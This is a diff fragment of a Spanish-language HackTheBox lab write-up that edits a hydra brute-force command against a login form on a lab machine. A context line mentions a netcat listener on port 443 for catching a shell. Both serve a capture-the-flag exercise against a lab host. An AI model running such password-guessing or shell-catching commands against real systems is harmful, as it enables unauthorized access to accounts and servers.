@@ -105,15 +105,9 @@ Mientras estamos en escucha con [[nc -nlvp 443]], y no se le dan importancia a l
 Intente correr hydra pero la verdad no me dio resultado, asi que termine mirando el writeup para la parte del login panel
 
 ```
-hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/Common-Credentials/10k-most-common.txt -s 8080 10.129.255.235 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:F=200" -t 10 -V -o resultado.txt
+hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/Common-Credentials/10k-most-common.txt -s 8080 10.129.255.235 http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -t 40
 ```
 # Creditos
 Writeup Oficial HackTheBox
-
-
-
-
-
-
 
 
